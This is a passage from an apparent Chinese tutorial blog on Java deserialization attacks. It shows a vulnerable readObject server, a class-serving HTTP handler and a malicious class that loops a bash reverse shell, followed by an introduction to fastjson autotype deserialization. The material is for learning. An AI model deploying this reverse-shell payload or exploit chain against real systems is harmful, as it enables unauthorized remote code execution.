boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//wait for connect</span>                Socket socket<span class="token operator">=</span>serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Connection received from "</span><span class="token operator">+</span>socket<span class="token punctuation">.</span><span class="token function">getInetAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">//readObject to DeSerialize实际调用的是JtaTransactionManager的object函数，最后server端调用lookup对攻击方恶意类进行加载</span>                    Object object <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Read object "</span><span class="token operator">+</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Exception caught while reading object"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>HttpFilterHandler.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HttpFileHandler</span> <span class="token keyword">implements</span> <span class="token class-name">HttpHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span>HttpExchange httpExchange<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"new http request from "</span><span class="token operator">+</span>httpExchange<span class="token punctuation">.</span><span class="token function">getRemoteAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>httpExchange<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            InputStream inputStream <span class="token operator">=</span> HttpFileHandler<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>httpExchange<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ByteArrayOutputStream byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            httpExchange<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            httpExchange<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            httpExchange<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ExportObject.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExportObject</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span><span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"bash -i >&amp; /dev/tcp/127.0.0.1/1111 0>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                Runtime.getRuntime().exec("gnome-calculator");</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">ExportObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//                Runtime.getRuntime().exec("gnome-calculator");</span>                Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"bash -i >&amp; /dev/tcp/127.0.0.1/1111 0>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>复现的时候没有啥反应，就和同事吃饭去了，回来的时候发现本地弹了几十个计算器….</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/37.png"></div><p>回来又试了一下好像不是很稳定。有的时候会卡住，反弹shell也没有直接弹出来</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/38.png"></div><h1 id="java反序列化入门（九）fastjson组件java反序化学习"><a href="#java反序列化入门（九）fastjson组件java反序化学习" class="headerlink" title="java反序列化入门（九）fastjson组件java反序化学习"></a>java反序列化入门（九）fastjson组件java反序化学习</h1><h2 id="认识fastjson"><a href="#认识fastjson" class="headerlink" title="认识fastjson"></a>认识fastjson</h2><h3 id="初步认识"><a href="#初步认识" class="headerlink" title="初步认识"></a>初步认识</h3><p>fastjson组件是阿里巴巴开发的反序列化与序列化组件，使用方法也很简单：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//序列化</span>String text <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//反序列化</span>VO vo <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//解析为JSONObject类型或者JSONArray类型</span>VO vo <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span><span class="token string">"{...}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//JSON文本解析成JSONObject类型</span>VO vo <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span><span class="token string">"{...}"</span><span class="token punctuation">,</span> VO<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//JSON文本解析成VO.class类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>User.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>fastjson<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用fastjson组件</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>fastjson<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializerFeature<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//创建一个用于实验的user类</span>        User user1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"lala"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user1<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//序列化</span>        String serializedStr <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"serializedStr="</span><span class="token operator">+</span>serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//通过parse方法进行反序列化，返回的是一个JSONObject</span>        Object obj1 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parse反序列化对象名称:"</span><span class="token operator">+</span>obj1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parse反序列化："</span><span class="token operator">+</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//通过parseObject,不指定类，返回的是一个JSONObject</span>        Object obj2 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化对象名称:"</span><span class="token operator">+</span>obj2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化:"</span><span class="token operator">+</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//通过parseObject,指定类后返回的是一个相应的类对象</span>        Object obj3 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">,</span>User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化对象名称:"</span><span class="token operator">+</span>obj3<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化:"</span><span class="token operator">+</span>obj3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//序列化</span>serializedStr<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"age"</span><span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token operator">:</span><span class="token string">"lala"</span><span class="token punctuation">}</span>parse反序列化对象名称<span class="token operator">:</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONObjectparse反序列化：<span class="token punctuation">{</span><span class="token string">"name"</span><span class="token operator">:</span><span class="token string">"lala"</span><span class="token punctuation">,</span><span class="token string">"age"</span><span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">}</span>parseObject反序列化对象名称<span class="token operator">:</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONObjectparseObject反序列化<span class="token operator">:</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token operator">:</span><span class="token string">"lala"</span><span class="token punctuation">,</span><span class="token string">"age"</span><span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">}</span>parseObject反序列化对象名称<span class="token operator">:</span>UserparseObject反序列化<span class="token operator">:</span>User<span class="token annotation punctuation">@5cea79f8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>parseObject({..})其实就是parse({..})的一个封装，对于parse的结果进行一次结果判定然后转化为JSONOBject类型。</p><p>三种反序列化函数执行过程的区别：</p><p>结论：<br>parse(“”) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法<br>parseObject(“”) 会调用反序列化目标类的特定 setter 和 getter 方法（此处有的博客说是所有setter，个人测试返回String的setter是不行的，此处打个问号）<br>parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</p><h3 id="产生的错误"><a href="#产生的错误" class="headerlink" title="产生的错误"></a>产生的错误</h3><p>fastjson提供特殊字符段被屏蔽的type，这个字段可以指定反序列化任意类，并且会自动调用类中属性的特定的set，get方法。</p><p>我们先来看一下这个字段的使用:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//@使用特定修饰符，写入被屏蔽的type序列化</span>String serializedStr1 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user1<span class="token punctuation">,</span>SerializerFeature<span class="token punctuation">.</span>WriteClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"serializedStr1="</span><span class="token operator">+</span>serializedStr1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过parse方法进行反序列化</span>Object obj4 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>serializedStr1<span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parse反序列化对象名称:"</span><span class="token operator">+</span>obj4<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化:"</span><span class="token operator">+</span>obj4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过这种方式返回的是一个相应的类对象</span>Object obj5 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr1<span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化对象名称:"</span><span class="token operator">+</span>obj5<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化:"</span><span class="token operator">+</span>obj5<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//序列化</span>serializedStr1<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"被屏蔽的type"</span><span class="token operator">:</span><span class="token string">"com.fastjson.User"</span><span class="token punctuation">,</span><span class="token string">"age"</span><span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token operator">:</span><span class="token string">"lala"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//parse反序列化</span>parse反序列化对象名称<span class="token operator">:</span>com<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>UserparseObject反序列化<span class="token operator">:</span>com<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>User<span class="token annotation punctuation">@1cf4f579</span><span class="token comment" spellcheck="true">//parseObject反序列化</span>parseObject反序列化对象名称<span class="token operator">:</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONObjectparseObject反序列化<span class="token operator">:</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token operator">:</span><span class="token string">"lala"</span><span class="token punctuation">,</span><span class="token string">"age"</span><span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，本该解析出来的被屏蔽的type都没有解析出来</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>Person.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//属性</span>    <span class="token keyword">public</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> String full_name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> Boolean sex<span class="token punctuation">;</span>    <span class="token keyword">private</span> Properties prop<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//构造函数</span>    <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Person构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//set</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setAge()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//get 返回Boolean</span>    <span class="token keyword">public</span> Boolean <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getSex()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sex<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//get 返回ProPerties</span>    <span class="token keyword">public</span> Properties <span class="token function">getProp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getProp()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>prop<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//在输出时会自动调用的对象ToString函数</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String s <span class="token operator">=</span> <span class="token string">"[Person Object] name="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">" full_name="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>full_name  <span class="token operator">+</span> <span class="token string">", age="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token string">", prop="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>prop <span class="token operator">+</span> <span class="token string">", sex="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sex<span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>type函数</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">type</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String eneity3 <span class="token operator">=</span> <span class="token 